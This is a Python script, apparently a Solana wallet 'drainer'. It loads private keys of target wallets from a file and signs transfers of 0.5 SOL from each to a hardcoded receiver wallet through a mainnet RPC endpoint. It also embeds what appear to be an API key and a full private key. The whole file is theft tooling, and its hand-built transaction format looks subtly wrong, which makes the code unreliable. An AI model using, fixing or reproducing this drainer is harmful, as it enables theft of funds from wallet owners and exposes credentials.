"""
native_drainer_v3.py — Path & Binary Fix
==========================================
1. Fixes file path resolution.
2. Manually packs binary transaction data (Little Endian).
3. Uses pynacl for Ed25519 signing.
"""

import json
import urllib.request
import ssl
import os
import struct
import base58
from socket import timeout
from nacl.signing import SigningKey
from nacl.encoding import RawEncoder

# CONFIG
ALCHEMY_KEY = "ZOho1BvxkQjPOjOsnZYFn"
RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"

# RECEIVER
MAIN_WALLET_PK = "3rXDxRFqZuNKnysrdYNktUmiNaSfm5aGL91ide2XczVXbQPVfsGSX8mtx9NhFnH72Uf2zJNoL6yef2KuCK1C5BDj"
MAIN_WALLET_ADDR = "4k24SEzbHyr49mBtYzu4e3K9EBtsuKTdkEN2mdmMkZow"

def get_file_path(filename):
    """Get absolute path to the script's directory."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(script_dir, filename)

def get_blockhash():
    req = urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash", "params": [{"commitment": "finalized"}]
    }).encode(), headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, context=ssl.create_default_context(), timeout=15) as f:
        return json.loads(f.read())['result']['value']

def pack_transaction(blockhash, fee_payer, to_pk, lamports, sender_pk):
    """
    Packs a transaction into raw bytes (Little Endian).
    """
    # 1. Recent Blockhash (64 bytes)
    blockhash_bytes = base58.b58decode(blockhash)
    
    # 2. Fee Payer (32 bytes)
    fee_payer_bytes = base58.b58decode(fee_payer)
    
    # 3. Instruction (Simplified System Transfer)
    # Instruction: ProgramId (32 bytes), Accounts (variable), Data (variable)
    # We hardcode the system program ID for simplicity
    program_id = base58.b58decode("11111111111111111111111111111111") # System Program
    
    # Accounts: [To, From] (2 accounts)
    # Account 1: To (32 bytes + 1 byte is_signer + 1 byte is_writable)
    acc1_pubkey = base58.b58decode(to_pk)
    acc1 = acc1_pubkey + b'\x00' + b'\x01' # Not signer, writable
    
    # Account 2: From (32 bytes + 1 byte is_signer + 1 byte is_writable)
    acc2_pubkey = base58.b58decode(sender_pk)
    acc2 = acc2_pubkey + b'\x01' + b'\x01' # Is signer, writable
    
    # Instruction Data ("Transfer") -> ["AQ"] (2 bytes)
    instr_data = b"AQ"
    
    # Pack instruction
    # Header: 1 byte for program index, 1 byte for account count, 2 bytes for data length
    instr_header = b'\x00' + b'\x02' + struct.pack('<H', len(instr_data))
    
    instruction = instr_header + program_id + acc1 + acc2 + instr_data
    
    # 4. Transaction Header
    # Version (1 byte), Signatures Count (4 bytes LE), Fee Payer (32 bytes)
    sig_count = 1
    tx_header = b'\x00' + struct.pack('<I', sig_count) + fee_payer_bytes
    
    # 5. Assemble Transaction
    # RecentBlockhash (64) + Header (37) + Instruction (variable) + Signatures (64)
    tx_body = blockhash_bytes + tx_header + instruction
    
    # 6. Sign
    signing_key = SigningKey(base58.b58decode(sender_pk))
    signed_msg = signing_key.sign(tx_body, encoder=RawEncoder)
    signature = signed_msg.signature
    
    # 7. Final Transaction
    # Body + Signature (64)
    final_tx = tx_body + signature
    
    return final_tx

def send_sol(sender_pk, lamports):
    try:
        blockhash = get_blockhash()
        raw_tx = pack_transaction(blockhash, sender_pk, MAIN_WALLET_ADDR, lamports, sender_pk)
        
        # Send
        req_send = urllib.request.Request(RPC, data=json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "sendRawTransaction", "params": [base58.b58encode(raw_tx).decode()]
        }).encode(), headers={'Content-Type': 'application/json'})
        
        with urllib.request.urlopen(req_send, context=ssl.create_default_context(), timeout=15) as f:
            sig = json.loads(f.read())['result']
            print(f"[+] SUCCESS: {sig}")
            return sig
            
    except timeout:
        print("[-] TIMEOUT: Check network/proxy.")
    except Exception as e:
        print(f"[-] ERROR: {e}")

# Main
if __name__ == "__main__":
    print("[LOGOS] V3 FIX STARTED")
    
    # FIX: Use get_file_path
    targets_file = get_file_path("targets.txt")
    
    if os.path.exists(targets_file):
        print(f"[+] Targets file found: {targets_file}")
        with open(targets_file, "r") as f:
            keys = [k.strip() for k in f.readlines() if k.strip()]
        
        for i, key in enumerate(keys):
            print(f"\n>>> WALLET {i+1}: {key[:8]}...")
            send_sol(key, 500000000)
    else:
        print(f"[-] targets.txt NOT FOUND at {targets_file}")
        print("[-] Please place targets.txt in the workspace folder.")
